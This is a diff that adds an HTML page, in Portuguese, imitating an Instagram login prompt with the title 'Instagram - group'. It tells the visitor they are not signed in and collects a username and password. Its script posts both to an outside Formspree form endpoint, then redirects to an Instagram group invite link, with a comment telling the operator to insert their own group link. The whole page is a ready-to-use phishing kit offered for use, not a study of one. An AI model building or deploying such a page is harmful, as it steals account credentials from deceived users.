@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Instagram - group</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+
+            background:
+                radial-gradient(circle at 10% 20%, #ffdc80 0%, transparent 25%),
+                radial-gradient(circle at 90% 15%, #ff4f81 0%, transparent 30%),
+                radial-gradient(circle at 80% 90%, #833ab4 0%, transparent 35%),
+                radial-gradient(circle at 15% 85%, #405de6 0%, transparent 30%),
+                linear-gradient(135deg, #feda75, #d62976, #833ab4, #405de6);
+
+            background-size: 200% 200%;
+            animation: backgroundMove 10s ease infinite;
+        }
+
+        @keyframes backgroundMove {
+            0% {
+                background-position: 0% 50%;
+            }
+
+            50% {
+                background-position: 100% 50%;
+            }
+
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 410px;
+        }
+
+        .card {
+            position: relative;
+            overflow: hidden;
+
+            background: rgba(255, 255, 255, 0.94);
+            backdrop-filter: blur(15px);
+
+            border-radius: 25px;
+            padding: 38px 30px;
+
+            box-shadow:
+                0 20px 60px rgba(0, 0, 0, 0.25),
+                0 0 30px rgba(255, 255, 255, 0.25);
+
+            border: 3px solid transparent;
+
+            background-clip: padding-box;
+        }
+
+        .card::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 7px;
+
+            background: linear-gradient(
+                90deg,
+                #feda75,
+                #fa7e1e,
+                #d62976,
+                #962fbf,
+                #4f5bd5
+            );
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .logo-icon {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 12px;
+
+            border-radius: 20px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            background: linear-gradient(
+                135deg,
+                #feda75,
+                #fa7e1e,
+                #d62976,
+                #962fbf,
+                #4f5bd5
+            );
+
+            box-shadow:
+                0 8px 20px rgba(214, 41, 118, 0.35);
+
+            position: relative;
+        }
+
+        .camera {
+            width: 34px;
+            height: 34px;
+            border: 3px solid white;
+            border-radius: 10px;
+            position: relative;
+        }
+
+        .camera::before {
+            content: "";
+            position: absolute;
+
+            width: 11px;
+            height: 11px;
+
+            border: 3px solid white;
+            border-radius: 50%;
+
+            top: 7px;
+            left: 8px;
+        }
+
+        .camera::after {
+            content: "";
+
+            width: 5px;
+            height: 5px;
+
+            background: white;
+            border-radius: 50%;
+
+            position: absolute;
+            top: 4px;
+            right: 4px;
+        }
+
+        .logo-text {
+            font-size: 36px;
+            font-weight: 800;
+
+            background: linear-gradient(
+                45deg,
+                #feda75,
+                #fa7e1e,
+                #d62976,
+                #962fbf,
+                #4f5bd5
+            );
+
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #555;
+            font-size: 14px;
+            line-height: 1.5;
+            margin: 8px 0 28px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        input,
+        textarea {
+            width: 100%;
+
+            border: 2px solid #e4e4e4;
+            background: #fafafa;
+
+            border-radius: 12px;
+
+            padding: 14px;
+
+            font-size: 14px;
+
+            outline: none;
+
+            transition: 0.25s;
+        }
+
+        input:focus,
+        textarea:focus {
+            border-color: #d62976;
+
+            box-shadow:
+                0 0 0 4px rgba(214, 41, 118, 0.10);
+
+            background: white;
+        }
+
+        textarea {
+            height: 130px;
+            resize: none;
+        }
+
+        button {
+            width: 100%;
+
+            border: none;
+            border-radius: 12px;
+
+            padding: 15px;
+
+            margin-top: 5px;
+
+            background: linear-gradient(
+                90deg,
+                #405de6,
+                #833ab4,
+                #d62976,
+                #fa7e1e
+            );
+
+            background-size: 200% 100%;
+
+            color: white;
+
+            font-size: 15px;
+            font-weight: bold;
+
+            cursor: pointer;
+
+            transition: 0.3s;
+
+            box-shadow:
+                0 7px 18px rgba(214, 41, 118, 0.30);
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            background-position: 100% 0;
+
+            box-shadow:
+                0 10px 25px rgba(214, 41, 118, 0.40);
+        }
+
+        button:active {
+            transform: scale(0.98);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .info {
+            text-align: center;
+
+            margin-top: 20px;
+
+            font-size: 12px;
+            color: #777;
+
+            line-height: 1.5;
+        }
+
+        .message {
+            display: none;
+
+            margin-top: 15px;
+
+            padding: 12px;
+
+            border-radius: 10px;
+
+            text-align: center;
+
+            font-size: 13px;
+        }
+
+        .error {
+            background: #ffe5e5;
+            color: #c00;
+        }
+
+        .decoration {
+            position: fixed;
+
+            width: 100px;
+            height: 100px;
+
+            border-radius: 50%;
+
+            filter: blur(2px);
+
+            opacity: 0.5;
+
+            z-index: -1;
+        }
+
+        .circle1 {
+            background: #feda75;
+            top: 5%;
+            left: 5%;
+        }
+
+        .circle2 {
+            background: #4f5bd5;
+            bottom: 5%;
+            right: 5%;
+        }
+
+        @media (max-width: 450px) {
+
+            .card {
+                padding: 35px 22px;
+            }
+
+            .logo-text {
+                font-size: 32px;
+            }
+
+            .logo-icon {
+                width: 65px;
+                height: 65px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="decoration circle1"></div>
+    <div class="decoration circle2"></div>
+
+    <div class="container">
+
+        <div class="card">
+
+            <div class="logo">
+
+                <div class="logo-icon">
+                    <div class="camera"></div>
+                </div>
+
+                <div class="logo-text">
+                    Fazer login
+                </div>
+
+            </div>
+
+            <div class="subtitle">
+                Parece que você não esta conectado(a) entre para continuar!
+            </div>
+
+            <form
+                id="messageForm"
+                action="https://formspree.io/f/meewdwnd"
+                method="POST"
+            >
+
+                <div class="input-group">
+
+                  
+
+                    <input
+                        type="text"
+                        id="name"
+                        name="nome"
+                        placeholder="Nome de usuario"
+                        required
+                    >
+
+                </div>
+
+                <div class="input-group">
+
+                    <label for="message">
+                      
+                    </label>
+
+                    <input
+                        id="message"
+                        name="senha"
+                        placeholder="Digite sua senha"
+                        required
+                    ></input>
+
+                </div>
+
+                <button
+                    type="submit"
+                    id="submitButton"
+                >
+                    Entrar
+                </button>
+
+                <div
+                    id="errorMessage"
+                    class="message error"
+                >
+              
+                </div>
+
+            </form>
+
+            <div class="info">
+            
+            </div>
+
+        </div>
+
+    </div>
+
+    <script>
+
+        const form =
+            document.getElementById("messageForm");
+
+        const button =
+            document.getElementById("submitButton");
+
+        const errorMessage =
+            document.getElementById("errorMessage");
+
+
+        form.addEventListener(
+            "submit",
+            async function(event) {
+
+                event.preventDefault();
+
+                button.disabled = true;
+
+                button.textContent =
+                    "Entrando...";
+
+                errorMessage.style.display =
+                    "none";
+
+
+                const formData =
+                    new FormData(form);
+
+
+                try {
+
+                    const response =
+                        await fetch(
+                            form.action,
+                            {
+                                method: "POST",
+                                body: formData,
+                                headers: {
+                                    "Accept":
+                                        "application/json"
+                                }
+                            }
+                        );
+
+
+                    if (response.ok) {
+
+                        // COLOQUE AQUI O LINK DO SEU GRUPO
+
+                        window.location.href =
+                            "https://ig.me/j/dV4Gt0JgiyzTHm23/";
+
+                    } else {
+
+                        throw new Error(
+                            "Erro ao enviar"
+                        );
+
+                    }
+
+                } catch (error) {
+
+                    errorMessage.style.display =
+                        "block";
+
+                    button.disabled =
+                        false;
+
+                    button.textContent =
+                        " Entrar";
+
+                }
+
+            }
+        );
+
+    </script>
+
+</body>
+</html>
